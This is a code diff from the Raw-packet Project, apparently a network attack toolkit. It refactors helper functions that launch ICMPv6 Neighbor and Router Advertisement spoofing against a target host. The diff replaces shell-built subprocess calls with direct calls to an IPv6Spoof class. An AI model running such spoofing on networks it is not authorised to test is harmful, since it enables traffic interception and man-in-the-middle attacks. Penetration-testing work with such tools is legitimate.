@@ -13,6 +13,7 @@ Copyright 2020, Raw-packet Project
 # region Import
 from raw_packet.Scripts.Others.ncc import NetworkConflictCreator
 from raw_packet.Scripts.ARP.arp_spoof import ArpSpoof
+from raw_packet.Scripts.IPv6.ipv6_spoof import IPv6Spoof
 from sys import path as sys_path
 from os.path import dirname, abspath
 from prettytable import PrettyTable
@@ -95,15 +96,13 @@ def make_na_spoof(network_interface: str = 'eth0',
                   dns_ipv6_address: Union[None, str] = None):
 
     # Start Neighbor Advertise spoofing script
-    if dns_ipv6_address is not None:
-        sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-                   ' --technique 2 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
-                   ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip ' + dns_ipv6_address + ' --quiet &'],
-                  shell=True)
-    else:
-        sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-                   ' --technique 2 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
-                   ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'], shell=True)
+    ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
+    ipv6_spoof.start(technique=2,
+                     target_ipv6_address=ipv6_address,
+                     target_mac_address=mac_address,
+                     gateway_ipv6_address=gateway_ipv6_address,
+                     dns_ipv6_address=dns_ipv6_address,
+                     quit=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -118,9 +117,12 @@ def make_ra_spoof(network_interface: str = 'eth0',
                   gateway_ipv6_address: str = 'fe80::1'):
 
     # Start Router Advertise spoofing script
-    sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-               ' --technique 1 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
-               ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'], shell=True)
+    ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
+    ipv6_spoof.start(technique=1,
+                     target_ipv6_address=ipv6_address,
+                     target_mac_address=mac_address,
+                     gateway_ipv6_address=gateway_ipv6_address,
+                     quit=True)
 
     # Wait 3 seconds
     sleep(3)
